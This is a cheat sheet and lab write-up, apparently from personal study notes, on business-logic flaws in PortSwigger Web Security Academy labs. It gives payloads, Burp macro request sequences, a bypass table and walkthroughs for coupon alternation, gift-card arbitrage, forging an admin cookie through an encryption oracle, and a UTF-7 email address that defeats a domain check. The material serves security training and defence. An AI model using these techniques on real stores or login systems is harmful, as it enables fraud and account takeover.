# Business logic - Business rule abuse (coupons, oracles, email parsers)

Domain-specific rules that appear robust have subtle loopholes: coupon "already used" checks don't account for alternating two codes; gift-card arbitrage creates infinite money; an error message that decrypts your input becomes an encryption oracle to forge auth cookies; email parser disagreements let you register as a privileged domain.

## Quick reference
```
# Coupon alternation
NEWCUST5 -> SIGNUP30 -> NEWCUST5 -> SIGNUP30 -> ... (repeat until price < store credit)
# each swap resets the "already applied" check because it checks only the last-used code

# Infinite money (gift card arbitrage)
buy $10 gift card with SIGNUP30 (30% off) = $7 cost -> redeem for $10 credit -> net +$3
automate: Burp macro (POST /cart -> POST /cart/coupon -> POST /cart/checkout
                      -> GET /cart/order-confirmation -> POST /gift-card) x 412 iterations

# Encryption oracle
error message "Invalid email address: <your-input>" = decryption of notification cookie
-> use email param to encrypt arbitrary input (result in Set-Cookie: notification)
-> use notification cookie to decrypt arbitrary ciphertext (result in error message)
-> forge stay-logged-in cookie:
   encrypt("xxxxxxxxxadministrator:<timestamp>") -> strip first 32 bytes -> valid admin cookie

# Email parser discrepancy (UTF-7)
=?utf-7?q?attacker&AEA-EXPLOIT-SERVER-ID&ACA-?=@ginandjuice.shop
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
         decodes to: attacker@EXPLOIT-SERVER-ID  (@ = &AEA-)
validation sees @ginandjuice.shop; email server sends to attacker@EXPLOIT-SERVER-ID
```

## Root cause
- **Coupon alternation:** "already used" check tracks only the last-applied coupon code, not a per-session set.
- **Infinite money:** business rule (30% off gift cards) creates positive arbitrage when gift cards are redeemable for face value.
- **Encryption oracle:** the same encryption key/algorithm is used for both user-controlled notification cookies and security-critical auth cookies; the app inadvertently exposes both encrypt and decrypt.
- **Email parser:** MIME encoded-word (RFC 2047) allows non-ASCII encoding of the `@` symbol; validation and SMTP delivery interpret addresses differently.

## Find it
**Coupon abuse:**
- Apply same coupon twice -> "already applied" error.
- Apply coupon A, then coupon B, then A again -> does it work? If so, alternate indefinitely.

**Infinite money:**
- Any gift card + discount coupon combo -> calculate: if `purchase_price x (1 - discount) < face_value` -> profitable loop.
- Check if gift cards can be purchased AND redeemed in the same account.

**Encryption oracle:**
- Find any error message that echoes your input in cleartext (e.g., "Invalid email: X").
- Find a cookie that appears to contain ciphertext (base64/URL-encoded random-looking blob).
- If the error reflects what the cookie was decrypting -> you have a decryption oracle.
- If submitting a value changes the cookie -> you have an encryption oracle.

**Email parser discrepancy:**
- Try registering with an encoded @ symbol: `=?utf-7?q?foo&AEA-bar?=@restricted.com`.
- If ISO-8859-1/UTF-8 encoded-word fails ("security reasons") but UTF-7 passes -> parser doesn't handle UTF-7.
- Craft: `=?utf-7?q?attacker&AEA-EXPLOIT-SERVER?=@restricted.com` -> confirmation to attacker, stored as @restricted.com.

## Technique
**Coupon alternation (Flawed enforcement):**
1. Get NEWCUST5 (visible on page) + SIGNUP30 (subscribe to newsletter).
2. Add jacket -> checkout -> apply NEWCUST5 -> apply SIGNUP30.
3. Apply NEWCUST5 again -> rejected if same. Try SIGNUP30 -> if accepted -> alternate.
4. Repeat: NEWCUST5 -> SIGNUP30 -> NEWCUST5 -> SIGNUP30 until total < $100.
5. Checkout.

**Infinite money (gift card macro):**
1. Sign up for newsletter -> get SIGNUP30 (30% off).
2. Manual verify: buy $10 gift card with SIGNUP30 = $7 -> redeem -> net +$3.
3. Automate with Burp Session handling macro:
   - Macro steps: `POST /cart` (add gift card) -> `POST /cart/coupon` -> `POST /cart/checkout` -> `GET /cart/order-confirmation?order-confirmed=true` -> `POST /gift-card`
   - Configure "gift-card" custom parameter from order-confirmation response body.
   - Map gift-card param in POST /gift-card to use prior response value.
4. Send `GET /my-account` to Intruder -> Null payloads x 412 -> max concurrent=1 -> run.
5. Result: ~412 x $3 = $1236 credit -> buy jacket.

**Encryption oracle (auth cookie forgery):**
1. Log in with "stay-logged-in" -> post a comment with invalid email -> observe:
   - `Set-Cookie: notification=<ciphertext>` and error `Invalid email address: <your-email>`
   - Means: notification cookie is the encrypted form of "Invalid email address: <email>"
2. Decrypt the `stay-logged-in` cookie via the notification param -> get `wiener:1598530205184`.
3. Format: `username:timestamp`. Want: `administrator:<timestamp>`.
4. Encrypt `xxxxxxxxxadministrator:<timestamp>` (9 x's pad the prefix to make 32 bytes to strip).
5. URL+Base64 decode the new ciphertext. Delete first 32 bytes (the 9 x's + "Invalid email address: " = 32 bytes, one full block).
6. Re-encode -> use as `stay-logged-in` cookie -> admin session.

**Email parser discrepancy (UTF-7):**
1. Register with `foo@ginandjuice.shop` -> blocked.
2. Try ISO/UTF-8 encoded-word -> "blocked for security reasons".
3. Try UTF-7: `=?utf-7?q?attacker&AEA-EXPLOIT-SERVER-ID&ACA-?=@ginandjuice.shop` -> succeeds.
4. Check email client -> confirmation received.
5. Click link -> log in -> admin panel -> delete carlos.

## Payload arsenal
```
# Coupon alternation
NEWCUST5 -> SIGNUP30 -> NEWCUST5 -> SIGNUP30 (repeat)

# Infinite money macro sequence
POST /cart              productId=<gift-card-id>&quantity=1
POST /cart/coupon       coupon=SIGNUP30
POST /cart/checkout     csrf=...
GET  /cart/order-confirmation?order-confirmed=true
POST /gift-card         gift-card=<extracted from response 4>

# Encryption oracle - encrypt arbitrary value
POST /post/comment      email=<payload>  -> Set-Cookie: notification=<ciphertext>

# Encryption oracle - decrypt arbitrary ciphertext
GET /post?postId=1      Cookie: notification=<ciphertext>  -> error reveals plaintext

# Admin cookie forge (after stripping 32 bytes from encrypted "xxxxxxxxxxxxxxxadministrator:ts")
Cookie: stay-logged-in=<forge_b64>

# UTF-7 email (@ = &AEA-, space = &ACA-)
=?utf-7?q?attacker&AEA-EXPLOIT-SERVER-ID&ACA-?=@ginandjuice.shop
```

## Bypasses
| Defense | Bypass |
|---|---|
| Coupon single-use per session | Alternate two coupons - "last used" check resets per swap |
| Gift cards non-profitable | 30% coupon makes $10 card cost $7 -> +$3/cycle arbitrage |
| Auth cookie opaque (encrypted) | Encryption oracle: encrypt your plaintext, strip prefix |
| Block-cipher prefix removal | Pad input to align to block boundary before stripping |
| Email domain restriction at registration | UTF-7 encoded @ -> email goes to attacker; stored as restricted domain |
| ISO/UTF-8 encoded-word blocked | UTF-7 encoding not recognised by some parsers |

## Exploitation walkthrough
**Coupon alternation:** apply NEWCUST5 -> SIGNUP30 -> NEWCUST5 -> SIGNUP30 (alternating). Each cycle reduces price by combined discount. After enough cycles total < $100 -> checkout.

**Infinite money:** manual test confirms +$3/cycle. Burp macro automates 412 cycles. After attack completes store credit ≈ $1236 -> buy $1337 jacket (need to accumulate enough first, or run more cycles).

**Encryption oracle:** decrypt stay-logged-in -> format=`wiener:ts`. Encrypt `xxxxxxxxxadministrator:ts` -> strip 32 bytes -> re-encode -> use as stay-logged-in -> admin dashboard -> delete carlos.

**Email parser:** UTF-7 encoded @ bypasses domain check. Server sends confirmation to attacker email. Click link -> log in -> admin -> delete carlos.

## Chaining
- Coupon loop -> infinite money -> buy anything (no further escalation needed).
- Encryption oracle -> admin account takeover -> [Access-control](../../Access-control/) / [Authentication](../../Authentication/).
- Email parser -> @privileged.com account -> admin panel (same as [Workflow-state-flaws](../Workflow-state-flaws/) inconsistent security controls, but at registration).

## Tools
- **Burp Repeater** - coupon alternation, oracle encrypt/decrypt, cookie tamper
- **Burp Intruder** - null payloads x 412 for infinite money attack
- **Burp Session handling + Macro** - automate buy-coupon-checkout-redeem cycle
- **Burp Decoder** - URL+Base64 decode/encode for cipher block manipulation
- **Hex editor (Burp Repeater "Hex" tab)** - delete exact bytes from ciphertext block

## Labs

### Flawed enforcement of business rules [Apprentice]
Get NEWCUST5 (on page) + SIGNUP30 (newsletter). Add jacket. Alternate coupons: NEWCUST5 -> SIGNUP30 -> repeat. Total drops each cycle. Key insight: "already applied" check only prevents consecutive use of the same code - alternating resets it.

### Infinite money logic flaw [Practitioner]
$10 gift card + 30% coupon = $7 cost -> $10 redemption -> net +$3. Burp macro automates the buy+redeem cycle. Intruder: null payloads x 412, concurrency=1. After attack: store credit ≈ $1236 -> buy jacket. Key insight: gift card arbitrage + macro automation = unlimited credit.

### Authentication bypass via encryption oracle [Practitioner]
`Post comment` with invalid email -> notification cookie = encrypted "Invalid email address: <input>". Use it as encrypt/decrypt oracle. Forge `administrator:<timestamp>` by encrypting with 9-char padding, then stripping 32 bytes (2 AES blocks). Paste as stay-logged-in cookie -> admin. Key insight: same key for notification cookie and auth cookie; two-way oracle allows arbitrary plaintext cookies.

### Bypassing access controls using email address parsing discrepancies [Expert]
Domain restriction (@ginandjuice.shop required). UTF-7 encoded @ (`&AEA-`) bypasses parser's "encoded-word" detection. Confirmation sent to attacker; stored address = @ginandjuice.shop -> admin access. Key insight: SMTP server decodes UTF-7 differently than registration validation.

## Real-world notes
- Coupon alternation bugs are endemic in e-commerce - always test with 2+ active codes.
- Gift card arbitrage with stacking discounts is a real revenue attack (Starbucks, etc).
- Encryption oracles appear anywhere the app both encrypts user input and returns ciphertext, AND decrypts and reflects ciphertext. Common in "remember me" + error-message combos.
- Email parser discrepancies (RFC 2047 encoded-word, IDN homoglyphs, plus-addressing) are an active research area - see the PortSwigger "Splitting the Email Atom" whitepaper.

## References
- https://portswigger.net/web-security/logic-flaws/examples#domain-specific-flaws
- https://portswigger.net/web-security/logic-flaws/examples#providing-an-encryption-oracle
- https://portswigger.net/web-security/logic-flaws/examples#email-address-parser-discrepancies
- https://portswigger.net/research/splitting-the-email-atom
